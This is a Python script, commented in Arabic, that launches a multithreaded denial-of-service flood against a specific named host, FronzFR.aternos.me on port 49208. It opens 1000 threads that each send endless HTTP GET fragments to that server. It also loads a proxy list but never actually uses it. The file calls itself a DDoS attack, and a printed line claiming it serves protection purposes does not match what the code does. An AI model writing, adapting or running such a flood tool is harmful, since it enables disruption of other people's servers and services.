import socket
import threading
import time
import json
from colorama import Fore, init
import requests

# تهيئة مكتبة colorama لاستخدام الألوان
init(autoreset=True)

# إعدادات الخادم
ip = "FronzFR.aternos.me"
port = 49208
num_threads = 1000  # عدد الخيوط (threads) لمحاكاة حركة المرور

# تحميل بيانات البروكسي من ملف Mejo.json
with open("Mejo.json", "r") as file:
    proxies_data = json.load(file)
proxies = proxies_data["Proxies"]

# دالة لاختيار بروكسي عشوائي
def get_random_proxy():
    import random
    proxy = random.choice(proxies)
    return proxy["url"]

# دالة لإرسال الطلبات إلى الخادم باستخدام البروكسي
def attack(ip, port, proxy_url):
    try:
        # استخدام البروكسي
        proxies = {
            "http": proxy_url,
            "https": proxy_url
        }

        # إنشاء سوكيت للاتصال بالخادم
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # مهلة الاتصال
        
        # محاولة الاتصال بالخادم
        sock.connect((ip, port))
        
        # إرسال طلبات بشكل متكرر (محاكاة الهجوم)
        while True:
            sock.sendto(b"GET / HTTP/1.1\r\n", (ip, port))
            print(Fore.GREEN + "[+] Request sent to the server")

    except Exception as e:
        print(f"[!] Error occurred: {e}")

# دالة لبدء الهجوم باستخدام خيوط متعددة
def start_attack(ip, port, num_threads):
    threads = []
    
    for i in range(num_threads):
        proxy_url = get_random_proxy()
        thread = threading.Thread(target=attack, args=(ip, port, proxy_url))
        threads.append(thread)
        thread.start()
        
    # انتظار حتى انتهاء جميع الخيوط
    for thread in threads:
        thread.join()

# الدالة لبدء الهجوم وإرسال الرسائل
def start_ddos_attack():
    print(Fore.GREEN + "[+] Attack started...")  # إرسال رسالة البدء
    start_time = time.time()

    # إرسال رسالة كل 10 ثوانٍ أثناء الهجوم
    while True:
        print(Fore.GREEN + "[+] Attack is ongoing...")  # إرسال رسالة مستمرة
        time.sleep(10)

        # إذا أردت إيقاف الهجوم بعد مدة معينة، ضع شرطًا هنا مثل:
        # if time.time() - start_time > مدة معينة:
        #     break

# تشغيل الاختبار
if __name__ == "__main__":
    print("الكود للأغراض حماية")
    print(f"[+] Starting DDoS attack simulation on {ip}:{port} with {num_threads} threads")
    
    # بدء الهجوم في خيوط متعددة
    attack_thread = threading.Thread(target=start_attack, args=(ip, port, num_threads))
    attack_thread.start()

    # بدء إرسال الرسائل المتكررة
    start_ddos_attack()

    attack_thread.join()  # انتظر حتى تنتهي الخيوط
    print(f"[+] Attack finished!")